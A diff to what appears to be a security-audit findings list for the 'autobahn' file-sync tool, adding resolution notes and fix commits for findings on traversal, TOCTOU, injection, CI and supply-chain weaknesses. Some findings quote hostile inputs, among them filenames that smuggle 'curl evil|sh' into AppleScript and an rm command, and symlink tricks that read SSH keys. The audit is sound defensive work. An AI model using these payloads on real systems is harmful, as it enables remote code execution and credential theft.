@@ -316,6 +449,7 @@ M-20 is LOCAL-07. Committed bench results are a hygiene item under L-37.
 - **What:** `is_pushable` validates pushed file names but not content; `trim()` leaves `../../<anything>`. On failover the follower creates session state at escaped locations; status writes replace same-named targets.
 - **Fix:** validate the identifier charset at `read_pushed_file` and in `SessionPlan::attached_alpha`.
 - **Resolution (2026-09-24):** deferred past v1 because peering is dangerously experimental. Ticket [PEER-3](fixes/PEER-3-pushed-session-id.md) applies the `is_session_identifier` check from [T1-2](fixes/T1-2-initialize-identifiers.md). Documented in `docs/peering.md`.
+- **Implemented (2026-09-24):** `85668a8`, `bd67173`. See `IMPLEMENTATION.md`.
 
 ### H-23. Peer-crafted rsync `Signature` drives quadratic CPU and multi-GB index memory
 
@@ -323,6 +457,8 @@ M-20 is LOCAL-07. Committed bench results are a hygiene item under L-37.
 - **Where:** `src/rsync/mod.rs:222-225` (unconditional `weak_index`), `:281-285` (linear bucket scan per position), via `local.rs:866`
 - **What:** `Signature::validate` checks structure but not `hashes.len()`. ~10⁸ hashes fit in the 4 GiB cap and build a multi-GB `HashMap`; colliding weak checksums force BLAKE3 plus a bucket scan per byte.
 - **Fix:** cap `hashes.len()` (flat or derived from base size); bound per-position candidate scans.
+- **Resolution (2026-09-24):** The cheap part, bounding `block_size` and `hashes.len()` in `Signature::validate`, is in [T2-1](fixes/T2-1-scan-delta-header.md). The rest is a tier 2 documented boundary.
+- **Implemented (2026-09-24):** `4eac723`, `bd67173`. See `IMPLEMENTATION.md`.
 
 ### H-24. Scanner directory-swap TOCTOU: a directory replaced by a symlink mid-walk exports out-of-root content to the peer
 
@@ -331,6 +467,7 @@ M-20 is LOCAL-07. Committed bench results are a hygiene item under L-37.
 - **What:** Path-based traversal with one `lstat` up front, no dirfd anchoring, no dev+ino recheck. A local writer spinning `rename(2)` swaps a real directory for a symlink to `$HOME`; the contents are scanned with real digests and shipped in the same cycle. A file swapped for a FIFO blocks `open()` with `scanning = true`.
 - **Fix:** fd-anchored traversal (`openat2` with `RESOLVE_NO_SYMLINKS` on Linux; `O_NOFOLLOW|O_DIRECTORY` plus dirfd-relative ops elsewhere); `fstat` after open and require regular file with matching dev+ino; at minimum re-`lstat` before descending.
 - **Resolution (2026-09-24, local users):** File-level swap fixed by [LOCAL-09](fixes/LOCAL-09-scanner-file-opens.md). The directory-level swap is a documented boundary, [LOCAL-10](fixes/LOCAL-10-descriptor-relative-rewrite.md).
+- **Implemented (2026-09-24):** `9486bea`. See `IMPLEMENTATION.md`.
 
 ### H-25. A sync root may contain the state root and `config.toml`; a peer rewrites the config and live reload runs its hooks
 
@@ -338,6 +475,8 @@ M-20 is LOCAL-07. Committed bench results are a hygiene item under L-37.
 - **Where:** `src/config.rs:880` (`plans()` checks overlap between sessions but not against the state root), `src/main.rs:818` (`run_sync`, same gap), `src/scan/mod.rs:59` (scanner hides only `.autobahn-tmp*`)
 - **What:** `alpha = "~"` syncs `~/.autobahn/config.toml`, `on-alert.sh`, ancestors and locks as tree content. A later-compromised peer edits `.autobahn/config.toml` in its tree; the next cycle writes it locally; the reloader plans it; the attacker's `agent_command` runs at the next spawn.
 - **Fix:** refuse planned endpoints whose resolved identity contains the state root or config file (both in `plans()` and `run_sync`) absent an explicit override; scanner always excludes the state-root subtree when it falls inside a root.
+- **Resolution (2026-09-24):** Confirmed: nothing compares a root with the state root or config. Ticket [F-H25](fixes/F-H25-root-contains-state.md).
+- **Implemented (2026-09-24):** `269bc65`, `707ea01`, `b5750eb`, `e023f9d`. See `IMPLEMENTATION.md`.
 
 ### H-26. `autobahn diff` scratch directory is a predictable, pre-creatable shared-`/tmp` path
 
@@ -346,6 +485,7 @@ M-20 is LOCAL-07. Committed bench results are a hygiene item under L-37.
 - **What:** `temp_dir()/autobahn-diff-<pid>`, `create_dir_all` (accepts a foreign-owned directory), then `std::fs::write` (follows symlinks) of both sides under deterministic names, default umask (0644). Cross-UID on Linux: pre-create with a symlink `alpha -> ~/.ssh/authorized_keys` to overwrite it, read both sides' contents, or swap files to poison the comparison before `resolve --keep`. macOS per-user `$TMPDIR` blunts the cross-UID arm.
 - **Fix:** 0700 directory that fails if it exists (or the `tempfile` crate, already a dev-dependency); `create_new`/`O_NOFOLLOW` writes.
 - **Resolution (2026-09-24, local users):** Fault, fixed by [LOCAL-04](fixes/LOCAL-04-diff-scratch.md).
+- **Implemented (2026-09-24):** `024ebcd`. See `IMPLEMENTATION.md`.
 
 ### H-27. AppleScript injection via `$AUTOBAHN_SUMMARY` in the shipped `on_alert` example: remote peer to local code execution
 
@@ -353,6 +493,8 @@ M-20 is LOCAL-07. Committed bench results are a hygiene item under L-37.
 - **Where:** `src/config.rs:162-163` (`ON_ALERT_EXAMPLE`, written by `autobahn init`), executed by `src/alerts.rs:488-491`; summary composed at `src/alerts.rs:330-350`, `src/supervisor/mod.rs:1909,2157-2184`, `src/supervisor/reload.rs:237-243`
 - **What:** The example runs `osascript -e "display notification \"$AUTOBAHN_SUMMARY\" ..."` with no escaping. The summary embeds `status.error`, which embeds peer-controlled filenames and raw error text (including TOML parse errors). A filename `x" & (do shell script "curl evil|sh") & "` executes as the local user on the next alert. The dispatcher itself passes values by environment, correctly; `src/tray.rs:785-790` shows the right escaping. Only fires if the user enables the example hook (shipped commented out) and `terminal-notifier` is absent.
 - **Fix:** escape `\` and `"` in `AUTOBAHN_SUMMARY`/`AUTOBAHN_DETAIL` at composition time and fix the example to pass text via argv; truncate and strip control characters from error text before it enters the alert environment.
+- **Resolution (2026-09-24):** Confirmed at `src/config.rs:163-164`; the ticket also rewrites existing copies of the shipped hook. Ticket [F-H27](fixes/F-H27-alert-hook-applescript.md).
+- **Implemented (2026-09-24):** `bc8e039`. See `IMPLEMENTATION.md`.
 - **Executed on macOS (2026-09-24, `d7c2e21`, MAC-BENCH 7d):** the shipped example, with only the `terminal-notifier` branch removed to stand in for "not installed", run as `src/alerts.rs:488` runs it. `AUTOBAHN_SUMMARY` carrying `x" & (do shell script "touch /tmp/mb7-pwned") & "` created the file. Note on the route: a *blocked path* does not put a name in the summary (`alert_summary` emits only a count), so this needs the `halted`/`errored` arms, which append the last clause of `status.error`.
 
 ### H-28. Release channel is checksums-only, from the same origin, with no signature; compromise is fleet-wide code execution
@@ -362,6 +504,7 @@ M-20 is LOCAL-07. Committed bench results are a hygiene item under L-37.
 - **What:** `SHA256SUMS` is fetched from the same release as the artifacts. No minisign/GPG/cosign, no pinned digest, no tag-immutability check. The downloaded binary is executed (`--version` smoke run) and the login service restarted onto it. `transport::install::ensure_agent` then streams the same release's agent bundle to every remote host and executes it. macOS artifacts are Developer-ID signed and notarized but neither `update` nor `install.sh` verifies that; Linux binaries are unsigned. `tar xzf` extraction has no member validation (second-order).
 - **Fix:** sign releases with an offline key pinned in the binary and installer, or publish build attestations; verify before checksum comparison in both `update.rs` and `install.sh`; `codesign --verify` on macOS; validate tar members.
 - **Resolution (2026-09-24):** Decided, [REL-1](fixes/REL-1-release-integrity.md). Step 1 fixes the installer half, and step 2 adds signing.
+- **Implemented:** REL-1 step 1, the strict installer, landed in `4458981`, `654c3c5` (2026-09-24). Step 2, signed releases, landed in `10096af` (2026-09-26).
 
 ### H-29. Blocked-path prefixes are interpolated unquoted into the `sudo chown` fix command the TUI copies to the clipboard
 
@@ -369,6 +512,8 @@ M-20 is LOCAL-07. Committed bench results are a hygiene item under L-37.
 - **Where:** `src/main.rs:1592-1616` (`blocked_fix`), `src/shop.rs:446-459` (`copy_fix`)
 - **What:** `ssh {destination} 'sudo chown -R {user} {root}/{where_}'` and `sudo chown -R "$(whoami)" {spec}/{where_}` are built with `where_` from on-disk names chosen by the other side. `;`, backticks, `$(...)`, `|`, newline, or `'` inject. The paste-and-run flow is the documented purpose. Incidental bug: `user` is set to the hostname when the destination has no `@`.
 - **Fix:** shell-quote every interpolated component; reject or elide prefixes outside a conservative charset; or execute structured fixes directly instead of round-tripping the clipboard.
+- **Resolution (2026-09-24):** Confirmed at `src/main.rs:1899-1916`; the codebase has no shell-quoting helper. Ticket [F-H29](fixes/F-H29-fix-command-quoting.md).
+- **Implemented (2026-09-24):** `335436b`, `674bb37`. See `IMPLEMENTATION.md`.
 
 ### H-30. Peer-controlled strings reach `resolve` as flags (no `--`)
 
@@ -378,6 +523,8 @@ M-20 is LOCAL-07. Committed bench results are a hygiene item under L-37.
 - **Fix:** insert `--` before positional arguments.
 
 (Placed in High because it turns a filename into a data-affecting CLI action; OPUS rated Medium.)
+- **Resolution (2026-09-24):** Confirmed at `src/tray.rs:731` and `src/shop.rs:437`. Ticket [F-H30](fixes/F-H30-resolve-argument-separator.md).
+- **Implemented (2026-09-24):** `81add20`. See `IMPLEMENTATION.md`.
 
 ### H-31. The attached alpha accepts files pushed by the leader, which can turn it into a follower of the leader's config
 
@@ -407,6 +554,7 @@ M-20 is LOCAL-07. Committed bench results are a hygiene item under L-37.
 - **What:** When the state root path exceeds ~100 bytes the socket moves to `temp_dir()/autobahn-<uid>/<name>.sock`. `create_dir_all` accepts a foreign-owned directory; the 0700 chmod and `remove_file` failures are discarded. The attacker's listener then receives `status`/`flush`/`shop`/tray requests and returns crafted responses (which chain into M-6). The client never checks the server's uid.
 - **Fix:** verify ownership and mode with `symlink_metadata` and refuse otherwise; `O_EXCL` creation; never swallow chmod/unlink failures; prefer `$XDG_RUNTIME_DIR`.
 - **Resolution (2026-09-24, local users):** Fault, fixed by [LOCAL-05](fixes/LOCAL-05-control-socket-fallback.md).
+- **Implemented (2026-09-24):** `d42d32c`. See `IMPLEMENTATION.md`.
 
 #### M-3. Staging directories and temporaries are world-readable, use predictable names, and follow planted symlinks
 
@@ -416,6 +564,7 @@ M-20 is LOCAL-07. Committed bench results are a hygiene item under L-37.
 - **Fix:** 0700 staging directories (refuse a pre-existing looser or foreign one) and 0600 files from first open; `create_new`/`O_NOFOLLOW`; require `symlink_metadata(staging_root)` be a real directory; keep temporaries out of the synced tree; stop embedding temp paths in peer-visible errors; test incomplete transfers under a permissive umask.
 - **Correction (2026-09-24):** The inside-root symlink arm is a Tier 1 fault, fixed by [T1-4](fixes/T1-4-reserved-names-and-staging-root.md). The root cause is that `validate_name` lets a peer create names with the `.autobahn-tmp` prefix, which the scanner then hides forever. T1-4 refuses what the scanner hides and verifies the staging root's type and owner. It also creates staging directories `0700` and, rather than refusing, tightens looser ones left by older versions. The predictable-name and pre-planted-symlink arms outside the root remain local-attacker items.
 - **Resolution (2026-09-24, local users):** The temporaries half is a fault, fixed by [LOCAL-03](fixes/LOCAL-03-staging-temporaries.md).
+- **Implemented (2026-09-24):** `6191775`, `694ac77`, `bbdd743`, `bd67173`. See `IMPLEMENTATION.md`.
 
 #### M-4. Tray "Show diff" writes peer-influenced content to a predictable shared-temp path; notifier resolved from `PATH`
 
@@ -424,6 +573,7 @@ M-20 is LOCAL-07. Committed bench results are a hygiene item under L-37.
 - **What:** `temp_dir()/autobahn-diff-<path with / → _>.diff` via symlink-following `std::fs::write`; name collisions (`a/b` vs `a_b`); world-readable leftovers. `which_notifier()` walks `PATH`.
 - **Fix:** per-user 0700 directory, `create_new`/`O_NOFOLLOW`, hash the name; absolute notifier path or document the reliance.
 - **Resolution (2026-09-24, local users):** Fault, fixed by [LOCAL-04](fixes/LOCAL-04-diff-scratch.md).
+- **Implemented (2026-09-24):** `024ebcd`. See `IMPLEMENTATION.md`.
 
 #### M-5. Apply-side check-then-act: no `openat`/`RESOLVE_BENEATH` confinement; chmod follows a swapped symlink
 
@@ -433,6 +583,7 @@ M-20 is LOCAL-07. Committed bench results are a hygiene item under L-37.
 - **Fix:** pin the parent as an `O_DIRECTORY|O_NOFOLLOW` fd and use `renameat`/`unlinkat`/`fchmodat(AT_SYMLINK_NOFOLLOW)`; `open(O_NOFOLLOW)` + `fchmod`; route `read_file`/`rename` through `verify_directory`.
 - **Correction (2026-09-24):** The `read_file`/`rename` part does not need a race or a local attacker, as the reviews assumed. A peer creates `root/link -> /home/you` under the default Raw symlink mode. `ReadFile("link/.ssh/id_ed25519")` then returns the key, and a keep-both rename through `link/` moves files outside the root. That part is a Tier 1 fault, fixed by [T1-3](fixes/T1-3-confined-read-and-rename.md). The check-then-use race in the transition path is still a local-attacker item.
 - **Resolution (2026-09-24, local users):** The race half is a documented boundary, [LOCAL-10](fixes/LOCAL-10-descriptor-relative-rewrite.md). The non-race half is T1-3.
+- **Implemented (2026-09-24):** `87cd702`, `bd67173`. See `IMPLEMENTATION.md`.
 
 #### M-6. Terminal escape-sequence injection from tree- and peer-controlled strings
 
@@ -441,6 +592,8 @@ M-20 is LOCAL-07. Committed bench results are a hygiene item under L-37.
 - **What:** POSIX names may contain anything but NUL and `/`. A filename with OSC 52 writes the clipboard; OSC 8 disguises links; CSI/CR repaints a fake "settled" line to coax `resolve --yes`. The escape-preserving width logic exists for autobahn's own colors but passes attacker sequences.
 - **Reproduced on macOS (2026-09-24, `d7c2e21`, MAC-BENCH 7j):** `issues` prints an OSC 52 name raw, twice — in the listing and inside the `resolve` command it offers to copy. `sync` escapes the same name through `Debug`, so one path sanitises by accident and the other does not. Whether a given terminal acts on it was not tested. **Resolution (2026-09-24):** ticket [F-M6](fixes/F-M6-terminal-escapes-in-issues.md).
 - **Fix:** one sanitize helper (C0/C1/ESC/BEL/DEL) applied to every tree- or peer-derived string at the presentation layer, including relayed stderr; raw bytes only in `--json`.
+- **Resolution (2026-09-24):** Confirmed against the current code. Ticket [F-M-OUT](fixes/F-M-OUT-untrusted-text.md).
+- **Implemented (2026-09-24):** `1667d19`, `57aec37`, `e36a8ac`, `f0035fe`. See `IMPLEMENTATION.md`.
 
 #### M-7. Log injection: forged log lines and escapes via filenames
 
@@ -448,6 +601,8 @@ M-20 is LOCAL-07. Committed bench results are a hygiene item under L-37.
 - **Where:** `src/supervisor/mod.rs:1746`, `src/logging.rs:96-142`
 - **What:** Newlines in names split a logged path into attacker-composed lines without timestamps.
 - **Fix:** escape non-printing characters at the log macros.
+- **Resolution (2026-09-24):** Confirmed against the current code. Ticket [F-M-OUT](fixes/F-M-OUT-untrusted-text.md).
+- **Implemented (2026-09-24):** `1667d19`, `57aec37`, `e36a8ac`, `f0035fe`. See `IMPLEMENTATION.md`.
 
 #### M-8. Remote `rm -f` prune script interpolates directory-listing output unquoted
 
@@ -455,6 +610,8 @@ M-20 is LOCAL-07. Committed bench results are a hygiene item under L-37.
 - **Where:** `src/transport/install.rs:296-318` (`prune_agents`), executed via `:355-369`
 - **What:** Names are filtered only by `starts_with("autobahn-") && !contains('/')`, then joined into `rm -f {names}`. `autobahn-x; curl evil | sh` passes and executes as the SSH user. The adjacent comment claims exact-name-only removal. Prerequisite is write access to the remote `~/.autobahn/bin`.
 - **Fix:** allowlist `[A-Za-z0-9._+-]` and shell-quote each path.
+- **Resolution (2026-09-24):** Confirmed against the current code. Ticket [F-M-OUT](fixes/F-M-OUT-untrusted-text.md).
+- **Implemented (2026-09-24):** `1667d19`, `57aec37`, `e36a8ac`, `f0035fe`. See `IMPLEMENTATION.md`.
 
 #### M-9. SSH inherits the user's `ssh_config` for connections that last days; host-key policy delegated
 
@@ -462,8 +619,10 @@ M-20 is LOCAL-07. Committed bench results are a hygiene item under L-37.
 - **Where:** `src/transport/mod.rs:73-84`
 - **What:** Only `BatchMode`, `ServerAlive*`, `Compression` are set. `ForwardAgent yes` exposes the controller's agent to the remote for the supervisor's lifetime; `RequestTTY force` corrupts the stream; `LocalForward` plus `ExitOnForwardFailure` breaks reconnects. `StrictHostKeyChecking` is unset (fail-closed by default with BatchMode, but a permissive user config removes MITM protection, making H-6/H-19 and the 4 GiB cap network-triggerable).
 - **Fix:** add `-T -o ForwardAgent=no -o ForwardX11=no -o ClearAllForwardings=yes -o PermitLocalCommand=no -o ConnectTimeout=...`; consider `StrictHostKeyChecking=accept-new` explicitly and document it.
+- **Resolution (2026-09-24):** [OPS-4](fixes/OPS-4-ssh-options.md). Host-key checking stays with the user's `ssh_config`.
 
 ### Security: resource exhaustion and missing bounds
+- **Implemented (2026-09-24):** `da3d30e`. See `IMPLEMENTATION.md`.
 
 #### M-10. 4 GiB message-reassembly ceiling enables memory exhaustion from a small wire footprint
 
@@ -471,6 +630,7 @@ M-20 is LOCAL-07. Committed bench results are a hygiene item under L-37.
 - **Where:** `src/transport/mod.rs:1017` (`MAXIMUM_MESSAGE_SIZE`), `:1173-1190`
 - **What:** Frames are capped before allocation, but a message reassembles from any number of frames up to 4 GiB in one `Vec` (~255× lz4 amplification from ~16 MiB on the wire, ~8 GiB transient during growth, then bincode can amplify further). Symmetric both directions.
 - **Fix:** lower the ceiling to the largest legitimate message, or per-type decode caps (`bincode::options().with_limit`), release partial buffers on channel failure.
+- **Resolution (2026-09-24):** Tier 2 documented boundary: a hostile peer is outside the genuine-binaries model.
 
 #### M-11. Unbounded `MuxRequest::Open`: thread, fd and watcher exhaustion
 
@@ -479,6 +639,7 @@ M-20 is LOCAL-07. Committed bench results are a hygiene item under L-37.
 - **What:** One scoped thread and `LocalEndpoint` (with a watcher) per Open, no cap; failed opens leave stale routing entries.
 - **Fix:** cap concurrent channels per connection; remove routing entries when a channel exits unanswered.
 - **Note (2026-09-24):** On the peering attach path a remote leader can trigger this. That case is deferred past v1 with ticket [PEER-1](fixes/PEER-1-attach-policy.md). The channel cap for ordinary agents stays open.
+- **Resolution (2026-09-24):** Tier 2 documented boundary: a hostile peer is outside the genuine-binaries model. The peering attach path is deferred separately with PEER-1.
 
 #### M-12. No timeouts on any request/response or connection-setup path; pool and writer locks held across blocking I/O
 
@@ -486,6 +647,8 @@ M-20 is LOCAL-07. Committed bench results are a hygiene item under L-37.
 - **Where:** `src/transport/mux.rs:126-132,253,390-396,605-636`; `src/transport/install.rs`; `src/transport/mod.rs:446-461,540-748`; `src/supervisor/control.rs:369-383`; `src/tray.rs:325-362`
 - **What:** No `ConnectTimeout`; handshake read, platform probe, upload and channel-open have no deadlines while the per-host pool lock is held, so one hung login (NFS rc file, conda init) blocks every session to that host. A live-but-mute agent wedges every session on the pooled connection with no error, so no retry or alert. A panic in an agent channel thread never sends a response, and the controller waits forever. Client control-socket calls have no timeout, so a wedged supervisor freezes `status`, the shop and the tray event loop.
 - **Fix:** `recv_timeout` on open/exchange (fail the connection); `ConnectTimeout`; do not hold the pool lock across network operations; client timeouts.
+- **Resolution (2026-09-24):** Decided: setup deadlines and silence detection from agent progress counters, both in v1, with an epoch bump for the new progress frame. Ticket [F-M-SUP](fixes/F-M-SUP-supervisor-robustness.md).
+- **Implemented (2026-09-24):** `29f368b`, `33821a6`, `56dc392`, `611054c`, `88cf319`, `b1b1463`. See `IMPLEMENTATION.md`.
 
 #### M-13. Remote stderr relayed with unbounded line buffering
 
@@ -493,6 +656,7 @@ M-20 is LOCAL-07. Committed bench results are a hygiene item under L-37.
 - **Where:** `src/transport/mod.rs:114,131-136`
 - **What:** `HELD_STDERR_LINES = 64` caps count, not bytes; a newline-free stream grows controller memory pre-handshake. Separately, the relay stops at the first non-UTF-8 line and later diagnostics are lost.
 - **Fix:** bounded reads with truncation; lossy decoding.
+- **Resolution (2026-09-24):** Tier 2 documented boundary: a hostile peer is outside the genuine-binaries model.
 
 #### M-14. Unbounded receive: no per-file or per-stream byte cap when staging peer content
 
@@ -500,6 +664,7 @@ M-20 is LOCAL-07. Committed bench results are a hygiene item under L-37.
 - **Where:** `src/endpoint/local.rs:905-951,986-1008`
 - **What:** `FileRequest` carries no expected size; op count is unlimited; digest checked only at `EndOfFile`. A hostile supplier fills the staging volume.
 - **Fix:** carry expected size, refuse bytes beyond size plus tolerance, cap per-stream totals, treat overrun as a protocol error.
+- **Resolution (2026-09-24):** Tier 2 documented boundary: a hostile peer is outside the genuine-binaries model.
 
 #### M-15. Snapshot delta streams have no aggregate or progress bound
 
@@ -507,6 +672,7 @@ M-20 is LOCAL-07. Committed bench results are a hygiene item under L-37.
 - **Where:** `src/endpoint/remote.rs:221-236,251-258`
 - **What:** Zero-byte ops are accepted as no-ops so the `output.len() > header.length` guard never fires; a hostile agent answers every `ScanPull` with non-empty no-op batches forever. Session wedges silently.
 - **Fix:** require byte progress per batch; cap total ops relative to `header.length`; fail the connection on violation.
+- **Resolution (2026-09-24):** Tier 2 documented boundary: a hostile peer is outside the genuine-binaries model.
 
 #### M-16. `digest_file` opens by path without `O_NOFOLLOW` and reads without a bound
 
@@ -517,6 +683,7 @@ M-20 is LOCAL-07. Committed bench results are a hygiene item under L-37.
 - **Resolution (2026-09-24, local users):** Fault, fixed by [LOCAL-09](fixes/LOCAL-09-scanner-file-opens.md).
 
 ### Security: supply chain, install and CI
+- **Implemented (2026-09-24):** `9486bea`. See `IMPLEMENTATION.md`.
 
 #### M-17. `install.sh` never verifies the agent bundle and installs unverified when the checksum fetch fails
 
@@ -525,6 +692,7 @@ M-20 is LOCAL-07. Committed bench results are a hygiene item under L-37.
 - **What:** The binary is checked against `SHA256SUMS`; `autobahn-agents.tar.gz` is not, though the release publishes an entry and `update.rs:127-131` verifies it. The `else` branch conflates "release publishes no checksums" with "download failed" and installs anyway, while `update` refuses. The bundle is the highest-blast-radius asset (pushed to every remote host) and gets the weakest check on the first-install path.
 - **Fix:** verify the bundle; distinguish fetch failure from asset absence and refuse on failure; explicit `--insecure`/`--allow-unverified` opt-in for the absent case.
 - **Resolution (2026-09-24):** Fault, fixed in v1 by step 1 of [REL-1](fixes/REL-1-release-integrity.md).
+- **Implemented (2026-09-24):** `4458981`, `654c3c5`. See `IMPLEMENTATION.md`.
 
 #### M-18. Update workspace in shared `/tmp` with default permissions (TOCTOU), no downgrade floor, `GH_HOST`/`GH_TOKEN` redirect the trust root, `--version` tag into `gh` argv without `--`
 
@@ -533,12 +701,15 @@ M-20 is LOCAL-07. Committed bench results are a hygiene item under L-37.
 - **What:** `create_dir_all` accepts a foreign-owned directory; the staged binary is 0644 and re-read after checksumming (exec at `:457`, copy at `:399` after the slow bundle refresh). No downgrade refusal. A tag beginning with `-` reads as a `gh` option (self-inflicted).
 - **Fix:** 0700 + fail-if-exists (as `install.sh`'s `mktemp -d` does); re-verify before `place_binary`; refuse downgrades unless explicit; pin release host; validate the tag against `^v?[A-Za-z0-9._-]+$`.
 - **Resolution (2026-09-24, local users):** The workspace part is a fault, fixed by [LOCAL-06](fixes/LOCAL-06-update-workspace.md). Downgrade floor and `GH_HOST` stay open as supply-chain items.
+- **Implemented (2026-09-24):** `e5409ea`. See `IMPLEMENTATION.md`.
 
 #### M-19. CI executes an unpinned third-party jar, has no top-level `permissions:` block, pins actions to mutable tags, and the secret-holding mac job has a write token
 
 - **Sources:** KIMI ABN-M19 (Confirmed/Likely) and ABN-L14; DEEPSEEK F22 (Low); OPUS S7 (Confirmed)
 - **Where:** `.github/workflows/ci.yml:81`, `spec-full.yml:22`, `spec/check.sh:15-18` (tla2tools.jar from `releases/latest`, no pin, no checksum); `ci.yml`/`spec-full.yml` (no `permissions:`); `release.yml:20` (`contents: write` for all jobs including `mac`), `:147-153` (tray `cargo build` runs build scripts while the Developer ID keychain is unlocked); all third-party actions on mutable tags
 - **Fix:** pin tag + SHA-256 or vendor the jar; `permissions: contents: read` at top with `write` only on the release job; SHA-pin actions plus dependabot for actions; compile before importing secrets.
+- **Resolution (2026-09-24):** Split across [CI-03](fixes/CI-03-pin-tla.md) (jar), [CI-04](fixes/CI-04-workflow-permissions.md) (permissions), [CI-05](fixes/CI-05-keychain-order.md) (keychain) and [CI-06](fixes/CI-06-action-pinning.md) (pinning). Correction: the repository's default token is read-only, so only `release.yml` was write-capable.
+- **Implemented (2026-09-24):** `220a5a5`, `46caf70`, `4fd86db`, `682f244`, `b5750eb`, `b9a2e3c`. See `IMPLEMENTATION.md`.
 
 #### M-20. Bench scripts use predictable shared-`/tmp` work dirs; a config swap yields command execution
 
@@ -547,6 +718,7 @@ M-20 is LOCAL-07. Committed bench results are a hygiene item under L-37.
 - **What:** `rm -rf` + `mkdir -p` under `set -u` without `-e`; a foreign-owned directory survives and the script writes a config containing `agent_command` there, then launches `watch`.
 - **Fix:** `mktemp -d`, `set -euo pipefail`, verify ownership.
 - **Resolution (2026-09-24, local users):** Fault, fixed by [LOCAL-07](fixes/LOCAL-07-bench-work-dirs.md).
+- **Implemented (2026-09-24):** `f4a79e7`. See `IMPLEMENTATION.md`.
 
 #### M-21. Service arguments are not safely serialized: systemd unit built by string concatenation, relative paths kept
 
@@ -554,8 +726,10 @@ M-20 is LOCAL-07. Committed bench results are a hygiene item under L-37.
 - **Where:** `src/service.rs:100-105,427-446`; `src/main.rs:595,606`
 - **What:** `ExecStart`, `Environment="AUTOBAHN_HOME=..."`, `StandardOutput` are interpolated with no quoting. A space splits arguments; `"` breaks the quoting; a newline injects directives; `%` is expanded; `AUTOBAHN_HOME=/x" "LD_PRELOAD=...` splits into two assignments. Relative `--config`/`--state-root` are stored without absolutizing, so the login service resolves them against a different cwd. `start`/`restart` validate the default config, not the `--config` baked into the unit. The macOS plist path escapes XML correctly.
 - **Fix:** resolve paths at install; escape per systemd rules; reject newlines; validate the unit's actual config.
+- **Resolution (2026-09-24):** Confirmed at `src/service.rs:100-106` and `:427-446`. Ticket [F-M-UPD](fixes/F-M-UPD-updater-and-service.md).
 
 ### Correctness and reliability
+- **Implemented (2026-09-24):** `59c7b68`. See `IMPLEMENTATION.md`.
 
 #### M-22. Disabled sessions are deleted by `clean`
 
@@ -563,6 +737,8 @@ M-20 is LOCAL-07. Committed bench results are a hygiene item under L-37.
 - **Where:** `src/main.rs:2839`
 - **What:** Cleanup derives retained state from active plans; disabled groups/hosts are absent, so their ancestor/session directory, status record and endpoint lock are selected for removal. Re-enabling starts without provenance and can resurrect deletions.
 - **Fix:** preserve configured-but-disabled identities separately from runnable plans. Test sync → disable → clean → enable, and prove history survives.
+- **Resolution (2026-09-24):** [OPS-2](fixes/OPS-2-clean-keeps-disabled.md).
+- **Implemented (2026-09-24):** `0d69c8f`. See `IMPLEMENTATION.md`.
 
 #### M-23. Cached scans bypass per-caller entry limits
 
@@ -570,6 +746,8 @@ M-20 is LOCAL-07. Committed bench results are a hygiene item under L-37.
 - **Where:** `src/endpoint/observer.rs:346`
 - **What:** The shared observer returns a published snapshot before checking the requester's `max_entry_count` (the observer key excludes it). A permissive caller warms the cache for a stricter one; a two-entry snapshot was accepted by a one-entry endpoint.
 - **Fix:** apply caller-specific limits on every return including cache hits.
+- **Resolution (2026-09-24):** Confirmed against the current code. Ticket [F-M-OBS](fixes/F-M-OBS-observer-and-watcher.md).
+- **Implemented (2026-09-24):** `0c39e6c`. See `IMPLEMENTATION.md`.
 
 #### M-24. Polling fallback serves stale snapshots for up to 120 s instead of the 5 s interval
 
@@ -577,6 +755,8 @@ M-20 is LOCAL-07. Committed bench results are a hygiene item under L-37.
 - **Where:** `src/endpoint/observer.rs:346-351`
 - **What:** Cache reuse does not require an active watcher. With watch establishment failed (e.g. `max_user_watches` exhausted) or one-shot mode, external writes do not advance the generation. Creating a second file did not change the next scan's count.
 - **Fix:** require an active, healthy watcher before treating an unchanged generation as freshness; polling must walk.
+- **Resolution (2026-09-24):** Confirmed against the current code. Ticket [F-M-OBS](fixes/F-M-OBS-observer-and-watcher.md).
+- **Implemented (2026-09-24):** `0c39e6c`. See `IMPLEMENTATION.md`.
 
 #### M-25. Linux watchers ignore re-included descendants
 
@@ -584,6 +764,8 @@ M-20 is LOCAL-07. Committed bench results are a hygiene item under L-37.
 - **Where:** `src/endpoint/local.rs:233-238`, `src/scan/mod.rs:875`
 - **What:** The scanner descends through an ignored directory when `holds_a_re_inclusion` requires it; watcher registration stops at any ignored directory. `vendor` + `!vendor/keep.txt` syncs initially but edits wait for the full walk.
 - **Fix:** share the scanner's traversal policy with watcher registration; Linux regression test.
+- **Resolution (2026-09-24):** Confirmed against the current code. Ticket [F-M-OBS](fixes/F-M-OBS-observer-and-watcher.md).
+- **Implemented (2026-09-24):** `0c39e6c`. See `IMPLEMENTATION.md`.
 
 #### M-26. Dynamic watch-registration failures are discarded
 
@@ -591,6 +773,8 @@ M-20 is LOCAL-07. Committed bench results are a hygiene item under L-37.
 - **Where:** `src/endpoint/local.rs:401-408`
 - **What:** `let _ = watch_tree(...)` for newly created or renamed directories. Hitting the inotify limit after startup leaves partial coverage marked healthy, no log line, no polling fallback, no retry. Contradicts the startup contract at `:205-209`.
 - **Fix:** surface through observer health, report, poll, retry.
+- **Resolution (2026-09-24):** Confirmed against the current code. Ticket [F-M-OBS](fixes/F-M-OBS-observer-and-watcher.md).
+- **Implemented (2026-09-24):** `0c39e6c`. See `IMPLEMENTATION.md`.
 
 #### M-27. A replaced root keeps a dead watcher until restart
 
@@ -598,12 +782,16 @@ M-20 is LOCAL-07. Committed bench results are a hygiene item under L-37.
 - **Where:** observer and watcher
 - **What:** After `mv A A.old && cp -a A.old A`, every later edit waits for the full scan and events from `A.old` mark unrelated paths.
 - **Fix:** record the root's `(dev, ino)`; rebuild on `MoveSelf`/`DeleteSelf` or mismatch.
+- **Resolution (2026-09-24):** Confirmed against the current code. Ticket [F-M-OBS](fixes/F-M-OBS-observer-and-watcher.md).
+- **Implemented (2026-09-24):** `0c39e6c`. See `IMPLEMENTATION.md`.
 
 #### M-28. A failed scan loses the dirty marks it consumed
 
 - **Sources:** OPUS M18 (Confirmed)
 - **Where:** `src/endpoint/observer.rs:392,401-409`
 - **What:** `result?` returns after `take_dirty` without resetting `last_full_scan`; the per-caller `max_entry_count` bail returns before the baseline is updated.
+- **Resolution (2026-09-24):** Confirmed against the current code. Ticket [F-M-OBS](fixes/F-M-OBS-observer-and-watcher.md).
+- **Implemented (2026-09-24):** `0c39e6c`. See `IMPLEMENTATION.md`.
 
 #### M-29. Concurrent publishing can prematurely move shared staged content
 
